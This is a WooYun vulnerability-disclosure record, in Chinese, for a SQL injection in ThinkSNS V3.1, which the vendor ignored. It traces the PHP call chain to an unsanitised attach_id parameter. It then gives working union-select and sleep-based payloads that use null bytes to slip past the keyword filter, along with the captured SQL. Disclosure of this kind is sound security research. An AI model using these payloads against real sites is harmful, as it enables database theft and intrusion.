{"id": 30425, "wybug_id": "wooyun-2015-095889", "wybug_title": "ThinkSNS 防御绕过思路(union select 真正的无限制sql注射)", "wybug_corp": "ThinkSNS", "wybug_author": "menmen519", "wybug_date": "2015-03-09 18:47", "wybug_open_date": "2015-06-12 18:49", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-14：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-12：\t细节向公众公开  简要描述： ThinkSNS 防御绕过2 详细说明：  这个代码跟的我好辛苦啊：\npublic function PostFeed()\t{\t\t\t// 返回数据格式\t\t$return = array('status'=>1, 'data'=>'');\t\t// 用户发送内容\t\t$d['content'] = isset($_POST['content']) ? filter_keyword(h($_POST['content'])) : '';\t\t// 原始数据内容\t\t$d['body'] = filter_keyword($_POST['body']);\t\t// 安全过滤\t\tforeach($_POST as $key => $val) {\t\t\t$_POST[$key] = t($_POST[$key]);\t\t}\t\t$d['source_url'] = urldecode($_POST['source_url']);  //应用分享到微博，原资源链接\t\t\t\t// 滤掉话题两端的空白\t\t$d['body'] = preg_replace(\"/#[\\s]*([^#^\\s][^#]*[^#^\\s])[\\s]*#/is\",'#'.trim(\"\\${1}\").'#',$d['body']);\t\t\t// 附件信息\t\t$d['attach_id'] = trim(t($_POST['attach_id']), \"|\");\t\tif ( !empty($d['attach_id']) ){\t\t\t$d['attach_id'] = explode('|', $d['attach_id']);\t\t\tarray_map( 'intval' , $d['attach_id'] );\t\t}\t\t// 发送微博的类型\t\t$type = t($_POST['type']);\t\t// 所属应用名称\t\t$app = isset($_POST['app_name']) ? t($_POST['app_name']) : APP_NAME;\t\t\t// 当前动态产生所属的应用\t\t\t\t$data = model('Feed')->put($this->uid, $app, $type, $d);\n跟进去put:\npublic function put($uid, $app = 'public', $type = '', $data = array(), $app_id = 0, $app_table = 'feed', $extUid = null, $lessUids = null, $isAtMe = true, $is_repost = 0) {\t\tif(false && isSubmitLocked()){\t\t\t$this->error = '发布内容过于频繁，请稍后再试';\t\t\treturn false;\t\t}\t\t// 判断数据的正确性\t\tif(!$uid || $type == '') {\t\t\t$this->error = L('PUBLIC_ADMIN_OPRETING_ERROR');\t\t\treturn false;\t\t}\t\tif ( strpos( $type , 'postvideo' ) !== false ){\t\t\t$type = 'postvideo';\t\t}\t\t//微博类型合法性验证 - 临时解决方案\t\tif ( !in_array( $type , array('post','repost','postvideo','postfile','postimage','weiba_post','weiba_repost') )){\t\t\t$type = 'post';\t\t}\t\t//应用类型验证 用于分享框 - 临时解决方案\t\tif ( !in_array( $app , array('w3g','public','weiba','tipoff') ) ){\t\t\t$app = 'public';\t\t\t$type = 'post';\t\t\t$app_table = 'feed';\t\t}\t\t\t\t$app_table = strtolower($app_table);\t\t// 添加feed表记录\t\t$data['uid'] = $uid;\t\t$data['app'] = $app;\t\t$data['type'] = $type;\t\t$data['app_row_id'] = $app_id;\t\t$data['app_row_table'] = $app_table;\t\t$data['publish_time'] = time();\t\t$data['from'] = isset($data['from']) ? intval($data['from']) : getVisitorClient();\t\t$data['is_del'] = $data['comment_count'] = $data['repost_count'] = 0;\t\t$data['is_repost'] = $is_repost;\t\t//判断是否先审后发\t\t$weiboSet = model('Xdata')->get('admin_Config:feed');        $weibo_premission = $weiboSet['weibo_premission'];\t\tif(in_array('audit',$weibo_premission) || CheckPermission('core_normal','feed_audit')){\t\t\t$data['is_audit'] = 0;\t\t}else{\t\t\t$data['is_audit'] = 1;\t\t}\t\t// 微博内容处理        if(Addons::requireHooks('weibo_publish_content')){        \tAddons::hook(\"weibo_publish_content\",array(&$data));        }else{        \t$content = $this->formatFeedContent($data['body']);        \t$data['body'] = $content['body'];        \t$data['content'] = $content['content'];        }        //分享到微博的应用资源，加入原资源链接        $data['body'] .= $data['source_url'];        $data['content'] .= $data['source_url'];\t\t        // 微博类型插件钩子\t\t// if($type){\t\t// \t$addonsData = array();\t\t// \tAddons::hook(\"weibo_type\",array(\"typeId\"=>$type,\"typeData\"=>$type_data,\"result\"=>&$addonsData));\t\t// \t$data = array_merge($data,$addonsData);\t\t// }        if( $type == 'postvideo' ){        \t$typedata = model('Video')->_weiboTypePublish( $_POST['videourl'] );        \tif ( $typedata && $typedata['flashvar'] && $typedata['flashimg'] ){        \t\t$data = array_merge( $data , $typedata );        \t} else {        \t\t$data['type'] = 'post';        \t}        \t\t        }     \t\t// 添加微博信息\t\t$feed_id =  $this->data($data)->add();\t\tif(!$feed_id) return false;\t\t  \t\tif(!$data['is_audit']){\t\t\t$touid = D('user_group_link')->where('user_group_id=1')->field('uid')->findAll();\t\t\t \t\t\tforeach($touid as $k=>$v){\t\t\t\tmodel('Notify')->sendNotify($v['uid'], 'feed_audit');\t\t\t}\t\t}\t\t// 目前处理方案格式化数据\t\t$data['content'] = str_replace(chr(31), '', $data['content']);\t\t$data['body'] = str_replace(chr(31), '', $data['body']);\t\t// 添加关联数据\t\t$feed_data = D('FeedData')->data(array('feed_id'=>$feed_id,'feed_data'=>serialize($data),'client_ip'=>get_client_ip(),'feed_content'=>$data['body']))->add();\t\t\t\t// 添加微博成功后\t\tif($feed_id && $feed_data) {\t\t\t//锁定发布\t\t\tlockSubmit();\t\t\t//微博发布成功后的钩子\t\t\t//Addons::hook(\"weibo_publish_after\",array('weibo_id'=>$feed_id,'post'=>$data));\t\t\t// 发送通知消息 - 重点 - 需要简化把上节点的信息去掉.\t\t\tif($data['is_repost'] == 1) {\t\t\t\t// 转发微博\t\t\t\t$isAtMe && $content = $data['content'];\t\t\t\t\t\t\t\t\t// 内容用户\t\t\t\t$extUid[] = $data['sourceInfo']['transpond_data']['uid'];\t\t\t\t// 资源作者用户\t\t\t\tif($isAtMe && !empty($data['curid'])) {\t\t\t\t\t// 上节点用户\t\t\t\t\t$appRowData = $this->get($data['curid']);\t\t\t\t\t$extUid[] = $appRowData['uid'];\t\t\t\t}\t\t\t\t} else {\t\t\t\t// 其他微博\t\t\t\t$content = $data['content'];\t\t\t\t//更新最近@的人\t\t\t\tmodel( 'Atme' )->updateRecentAt( $content );\t\t\t\t\t\t\t\t// 内容用户\t\t\t}\t\t\t\t\t\t// 发送@消息\t\t\tmodel('Atme')->setAppName('Public')->setAppTable('feed')->addAtme($content, $feed_id, $extUid, $lessUids);\n再跟进去addAtme：\npublic function addAtme($content, $row_id, $extra_uids = null, $less_uids = null) {        // 去除重复，空值与自己        $extra_uids = array_diff($extra_uids, array($GLOBALS['ts']['mid']));        $extra_uids = array_unique($extra_uids);        $extra_uids = array_filter($extra_uids);        $less_uids[] = $GLOBALS['ts']['mid'];        $less_uids = array_unique($less_uids);        $less_uids = array_filter($less_uids);        // 获取@用户的UID数组    \t$uids = $this->getUids($content, $extra_uids, $row_id, $less_uids);\n继续跟进getUids：\npublic function getUids($content, $extra_uids = null, $row_id, $less_uids = null) {        // 正则匹配内容    \tpreg_match_all($this->_at_regex, $content, $matches);    \t$unames = $matches[1];    \t$map = \"uname in ('\".implode(\"','\",$unames).\"')\";    \t$ulist = model('User')->where($map)->field('uid')->findall();    \t$matchuids = getSubByKey($ulist,'uid');        // 如果内容匹配中没有用户        if(empty($matchuids) && !empty($extra_uids)) {            // 去除@用户ID            if(!empty($less_uids)) {                foreach($less_uids as $k => $v) {                    if(in_array($v, $extra_uids)) {                        unset($extra_uids[$k]);                    }                }            }            return is_array($extra_uids) ? $extra_uids : array($extra_uids);        }        // 如果匹配内容中存在用户        $suid = array();        foreach($matchuids as $v) {            !in_array($v, $suid) && $suid[] = (int)$v;        }        // 去除@用户ID        if(!empty($less_uids)) {            foreach($suid as $k => $v) {                if(in_array($v, $less_uids)) {                    unset($suid[$k]);                }            }        }        \t\t// 发邮件流程        $author = model('User')->getUserInfo($GLOBALS['ts']['mid']);        $content = model('Source')->getSourceInfo($this->_app_table, $row_id, false, $this->_app);\n再看看getSourceInfo：\npublic function getSourceInfo($table, $row_id, $_forApi = false, $appname = 'public') {\t\tstatic $forApi = '0';\t\t$forApi == '0' && $forApi = intval ( $_forApi );\t\t\t\t$key = $forApi ? $table . $row_id . '_api' : $table . $row_id;\t\tif ($info = static_cache ( 'source_info_' . $key )) {\t\t\treturn $info;\t\t}\t\t\t\tswitch ($table) {\t\t\tcase 'feed' :\t\t\t\t$info = $this->getInfoFromFeed ( $table, $row_id, $_forApi );\n再跟进去getInfoFromFeed :\nprivate function getInfoFromFeed($table, $row_id, $forApi) {\t\t$info = model ( 'Feed' )->getFeedInfo ( $row_id, $forApi );\n再跟进getFeedInfo：\npublic function getFeedInfo($id, $forApi = false) {\t\t$data = model( 'Cache' )->get( 'feed_info_'.$id );\t\t\t\tif ( $data !== false && ($forApi === false || ($forApi === true && isset($data['iscoll'])) ) ){\t\t\treturn $data;\t\t}\t\t$map['a.feed_id'] = $id;\t\t\t\t// //过滤已删除的微博 wap 版收藏\t\t// if($forApi){\t\t// \t$map['a.is_del'] = 0;\t\t// }\t\t\t\t$data = $this->where($map)\t\t\t\t\t ->table(\"{$this->tablePrefix}feed AS a LEFT JOIN {$this->tablePrefix}feed_data AS b ON a.feed_id = b.feed_id \")\t\t\t\t\t ->find();\t\t\t\t$fd = unserialize($data['feed_data']);\t\t\t$userInfo = model('User')->getUserInfo($data['uid']);\t\t$data['ctime'] = date('Y-m-d H:i',$data['publish_time']);\t\t$data['content'] = $forApi ? parseForApi($fd['body']):$fd['body'];\t\t$data['uname'] = $userInfo['uname'];\t\t$data['user_group'] = $userInfo['api_user_group'];\t\t$data['avatar_big'] = $userInfo['avatar_big'];\t\t$data['avatar_middle'] = $userInfo['avatar_middle'];\t\t$data['avatar_small']  = $userInfo['avatar_small'];\t\tunset($data['feed_data']);\t\t\t\t// 微博转发\t\tif($data['type'] == 'repost'){\t\t\t$data['transpond_id'] = $data['app_row_id'];\t\t\t$data['transpond_data'] = $this->getFeedInfo($data['transpond_id'], $forApi);\t\t}\t\t\t\t// 附件处理\t\tif(!empty($fd['attach_id'])) {\t\t\t$data['has_attach'] = 1;\t\t\t\t\t\t$attach = model('Attach')->getAttachByIds($fd['attach_id']);\n第一步：$fd = unserialize($data['feed_data']);\t第二步：$attach = model('Attach')->getAttachByIds($fd['attach_id']);这时候 在跟进到getAttachByIds 这里面：\npublic function getAttachByIds($ids, $field = '*') {\t\tif(empty($ids)) {\t\t\treturn false;\t\t}\t\t!is_array($ids) && $ids = explode(',', $ids);\t\t$map['attach_id'] =\tarray('IN', $ids);\t\t$data = $this->where($map)->field($field)->findAll();\t\treturn $data;\t}\n造成一个看起来和二次注意一样的，但是又没有任何限制的注入：构造url:http://localhost/ThinkSNS_V3.1_20131108_28822/index.php?app=public&mod=Feed&act=PostFeedpostdata:type=xxxxx&content=yyyy&body=xxxx&source_url=xxxx&attach_id=1)) uni%00on select 0x273c3f70687020706870696e666f28293f3e27 ,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 fro%00m `ts_attach` #后台抓取的sql：2015/2/5 20:48\tSELECT * FROM `ts_attach` WHERE ( `attach_id` IN (1)) union select 0x273c3f70687020706870696e666f28293f3e27 ,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from `ts_attach` #) )触发漏洞条件1.注册一个普通用户2.refresh只要是本站就可以我们设置为http://localhost:8081/ThinkSNS/index.php?app=public&mod=Feed&act=PostFeed3.为了明显期间我们采用延时盲注进行测试发送url:http://localhost:8081/ThinkSNS/index.php?app=public&mod=Feed&act=PostFeedpostdata:type=xxxxx&content=yyyy&body=xxxx&source_url=xxxx&attach_id=1)) uni%00on sele%00ct sle%00ep(1%2f10),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 fro%00m `ts_attach` #referer:http://localhost:8081/ThinkSNS/index.php?app=public&mod=Feed&act=PostFeed后台抓取sql为:2015/3/2 13:22\tSELECT * FROM `ts_attach` WHERE ( `attach_id` IN (1)) union select sleep(1/10),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from `ts_attach` #) )   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-06-12 18:49 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-09 19:59 |    \t\t小清新 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 以后再写)\t\t \n  mark下  万一火了那   等公开    \n     2015-06-12 22:34 |    \t\t黑暗游侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:1780 漏洞数:268        | 123)\t\t \n  没看懂厂商啥意思。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}